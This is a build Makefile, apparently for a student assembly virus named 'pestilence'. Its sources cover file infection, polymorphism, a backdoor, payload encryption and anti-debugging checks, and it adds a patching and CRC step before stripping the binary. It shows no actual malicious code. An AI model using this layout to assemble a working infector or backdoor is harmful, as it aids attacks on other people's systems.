EXEC		=	pestilence
SRC			=	famine.s \
				checkproctest.s \
				ft_strlen.s \
				ft_is_integer_string.s \
				ft_strequ.s \
				checkdbg.s \
				crc32.s \
				checkdbg_by_status_file.s \
				ft_strstr.s \
				ft_atoi.s \
				ft_itoa.s \
				jmp_to_function.s \
				encrypted_part_start.s \
				readdir.s \
                start_infect.s \
				fork.s \
				table.s \
				polymorphism.s \
				create_backdoor.s \
				famine_options.s \
				update_mmaped_file.s \
				encrypt.s \
				treat_file.s \
				padding.s \
				depacker.s
OBJ			=	$(SRC:.s=.o)
NASM		=	nasm
NASMFLAGS	=	-f elf64
LINKER		=	ld
CC			=	gcc
CALCUL_EXEC	=	calcul_crc32_pestilence
CALCUL_SRC	=	calcul_pestilence_size.c \
				patch_encrypter.c
CALCUL_OBJ	=	$(CALCUL_SRC:.c=.o)

all: patch

$(EXEC): $(OBJ)
	$(info Compiling $(EXEC))
	@$(LINKER) -o $@ $^

$(CALCUL_EXEC):
	$(info Patch $(EXEC))
	@$(CC) -o calcul_pestilence_size.o -c calcul_pestilence_size.c
	@$(CC) -o patch_encrypter.o -c patch_encrypter.c
	@$(CC) -o $(CALCUL_EXEC) $(CALCUL_OBJ) crc32.o
	@./$(CALCUL_EXEC)
	$(info Strip $(EXEC))
	strip -s ./$(EXEC)

patch: $(EXEC) $(CALCUL_EXEC)

%.o: %.s
	$(info Compiling $< into $@ ...)
	@$(NASM) $(NASMFLAGS) -o $@ $<

clean:
	$(info Cleaning ./ ...)
	rm -f $(OBJ) $(CALCUL_OBJ)
	$(info Done !)

fclean: clean
	$(info Cleaning ./ ...)
	@rm -rf $(EXEC) $(CALCUL_EXEC)
	$(info Done !)

re: fclean all

.PHONY: all clean fclean re
